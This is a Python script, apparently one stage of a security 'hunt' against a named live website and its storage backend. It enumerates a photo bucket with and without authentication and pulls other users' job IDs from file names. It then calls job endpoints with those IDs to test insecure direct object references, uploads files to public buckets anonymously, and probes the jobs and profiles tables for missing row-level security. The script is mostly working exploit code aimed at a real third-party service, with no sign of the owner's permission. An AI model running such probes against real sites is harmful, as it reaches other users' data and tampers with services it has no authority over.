#!/usr/bin/env python3
"""Hunt 2/6: IDOR probes on job-id based API routes + public storage bucket exposure.

Uses only our own test account token. Real user content is NEVER downloaded: for JSON
responses we print only keys and REDACTED values; for storage objects we do a HEAD only
(status / content-type / size) to prove unauthenticated readability.
"""
import json
import urllib.error
import urllib.request

BASE = "https://cdn.onlyfakeai.ru"
SITE = "https://onlyfakeai.ru"
KEY = "<publishable-key>"
TOKEN = open("/tmp/token.txt").read().strip()


UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0 Safari/537.36"


def call(method, url, headers=None, data=None, timeout=30):
    headers = dict(headers or {})
    headers.setdefault("User-Agent", UA)
    headers.setdefault("Accept", "application/json")
    req = urllib.request.Request(url, method=method, headers=headers, data=data)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:  # noqa: BLE001 - network errors are evidence too
        return -1, {}, repr(e).encode()


def redact(value):
    s = str(value)
    if len(s) < 18:
        return s
    if "://" in s:
        scheme, rest = s.split("://", 1)
        host = rest.split("/")[0]
        tail = rest.rsplit("/", 1)[-1]
        # keep structure, mask the file token
        masked = tail
        for part in tail.replace(".", "_").split("_"):
            if len(part) >= 8 and masked.count(part):
                masked = masked.replace(part, "<redacted>")
        return f"{scheme}://{host}/.../{masked[:120]}"
    return s[:6] + "...<redacted>" + s[-4:]


def show_json(label, status, body, max_keys=25):
    print(f"{label}: HTTP {status} ({len(body)} bytes)")
    try:
        obj = json.loads(body)
    except Exception:
        print(f"   raw(head): {body[:300]!r}")
        return None
    if isinstance(obj, dict):
        for i, (k, v) in enumerate(obj.items()):
            if i >= max_keys:
                print("   ...")
                break
            if isinstance(v, (dict, list)):
                print(f"   {k}: <{type(v).__name__} len={len(v)}>")
            else:
                print(f"   {k}: {redact(v)}")
    else:
        print(f"   list len={len(obj)}")
    return obj


def main():
    auth = {"apikey": KEY, "Authorization": "Bearer " + TOKEN, "Accept": "application/json"}

    print("=" * 70)
    print("A. Public storage listing of bucket 'photos' (ALSO ANON)")
    print("=" * 70)
    ent = json.dumps({"prefix": "", "limit": 10, "offset": 0, "sortBy": {"column": "name", "order": "asc"}}).encode()
    headers = {"apikey": KEY, "Authorization": "Bearer " + TOKEN, "Content-Type": "application/json"}
    st, _h, body = call("POST", f"{BASE}/storage/v1/object/list/photos", headers, ent)
    print(f"authed list photos -> HTTP {st} ({len(body)} bytes)")
    names = []
    try:
        items = json.loads(body)
        print(f"entries: {len(items)}")
        for it in items[:10]:
            meta = it.get("metadata") or {}
            name = it.get("name", "")
            names.append(name)
            print(
                f"  name={name} (len={len(name)}) size={meta.get('size')} mime={meta.get('mimetype')} updated={it.get('updated_at')}"
            )
            # filename timestamp prefix = candidate job id
            prefix = name.split("_")[0]
            print(f"     timestamp-prefix candidate jobId: {prefix} (len={len(prefix)})")
    except Exception as exc:
        print("  parse err", exc, body[:300])

    # anon listing (no bearer, only apikey)
    anon_headers = {"apikey": KEY, "Content-Type": "application/json"}
    st2, _h2, body2 = call("POST", f"{BASE}/storage/v1/object/list/photos", anon_headers, ent)
    print(f"anon   list photos -> HTTP {st2} ({len(body2)} bytes)")

    print()
    print("=" * 70)
    print("B. Unauthenticated public object access (HEAD only, no download)")
    print("=" * 70)
    for name in names[:3]:
        if not name or name.startswith(".empty"):
            continue
        url = f"{BASE}/storage/v1/object/public/photos/{urllib.request.quote(name)}"
        st3, h3, _b = call("HEAD", url)
        ctype = h3.get("Content-Type", h3.get("content-type"))
        clen = h3.get("Content-Length", h3.get("content-length"))
        print(f"  HEAD {url.split('/photos/')[1][:3]}... -> HTTP {st3} content-type={ctype} content-length={clen}")

    print()
    print("=" * 70)
    print("C. IDOR on job routes using real (other-user) job timestamps")
    print("=" * 70)
    candidates = []
    for n in names:
        if not n or n.startswith(".empty"):
            continue
        pfx = n.split("_")[0]
        if pfx.isdigit() and pfx not in candidates:
            candidates.append(pfx)
    print(f"candidate job ids: {candidates[:5]}")

    for jid in candidates[:3]:
        st4, _h4, body4 = call("GET", f"{SITE}/api/no-watermark/{jid}", auth)
        show_json(f"GET /api/no-watermark/{jid} (valid bearer, NOT our job)", st4, body4)
        st5, _h5, body5 = call("GET", f"{SITE}/api/status/{jid}", {"Accept": "application/json"})
        show_json(f"GET /api/status/{jid} (no auth at all)", st5, body5)

    print()
    print("=" * 70)
    print("D. Control: bogus ids")
    print("=" * 70)
    for jid in ["test1", "0", "1", "1700000000000"]:
        st6, _h6, body6 = call("GET", f"{SITE}/api/no-watermark/{jid}", auth)
        show_json(f"GET /api/no-watermark/{jid}", st6, body6)
        st7, _h7, body7 = call("GET", f"{SITE}/api/status/{jid}", {"Accept": "application/json"})
        show_json(f"GET /api/status/{jid}", st7, body7)

    print()
    print("=" * 70)
    print("E. Storage upload as ANON (no bearer) to public buckets")
    print("=" * 70)
    png = bytes.fromhex(
        "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000d4944415478da63f8ffff3f0005fe02fea1c4a1b30000000049454e44ae426082"
    )
    for bucket in ["photos", "backgrounds", "portraits-public"]:
        name = "vulnrat-anon-probe.png"
        h = {"apikey": KEY, "Content-Type": "image/png", "x-upsert": "false"}
        st8, _h8, body8 = call("POST", f"{BASE}/storage/v1/object/{bucket}/{name}", h, png)
        print(f"anon upload {bucket}/{name} -> HTTP {st8} {body8[:200]!r}")
        # cleanup attempt with our authed token
        if st8 in (200, 201):
            hd = {"apikey": KEY, "Authorization": "Bearer " + TOKEN}
            st9, _h9, body9 = call("DELETE", f"{BASE}/storage/v1/object/{bucket}/{name}", hd)
            print(f"   cleanup delete -> HTTP {st9} {body9[:120]!r}")

    print()
    print("=" * 70)
    print("F. Authed upload to portraits-public with correct MIME (no overwrite)")
    print("=" * 70)
    name = "vulnrat-audit-probe.png"
    h = {"apikey": KEY, "Authorization": "Bearer " + TOKEN, "Content-Type": "image/png", "x-upsert": "false"}
    st10, _h10, body10 = call("POST", f"{BASE}/storage/v1/object/portraits-public/{name}", h, png)
    print(f"authed upload portraits-public/{name} -> HTTP {st10} {body10[:200]!r}")
    if st10 in (200, 201):
        hd = {"apikey": KEY, "Authorization": "Bearer " + TOKEN}
        st11, _h11, body11 = call("DELETE", f"{BASE}/storage/v1/object/portraits-public/{name}", hd)
        print(f"   cleanup delete -> HTTP {st11} {body11[:120]!r}")

    print()
    print("=" * 70)
    print("G. jobs table RLS quick checks (authed)")
    print("=" * 70)
    st12, _h12, body12 = call(
        "GET", f"{BASE}/rest/v1/jobs?select=*&limit=3", {"apikey": KEY, "Authorization": "Bearer " + TOKEN}
    )
    show_json("authed jobs?select=*", st12, body12)
    st13, _h13, body13 = call("GET", f"{BASE}/rest/v1/jobs?select=id,user_id&limit=3", {"apikey": KEY})
    show_json("anon jobs?select=id,user_id", st13, body13)
    st14, _h14, body14 = call(
        "GET",
        f"{BASE}/rest/v1/profiles?select=user_id,role&limit=100",
        {"apikey": KEY, "Authorization": "Bearer " + TOKEN},
    )
    show_json("authed profiles?limit=100 (RLS scope)", st14, body14)


if __name__ == "__main__":
    main()
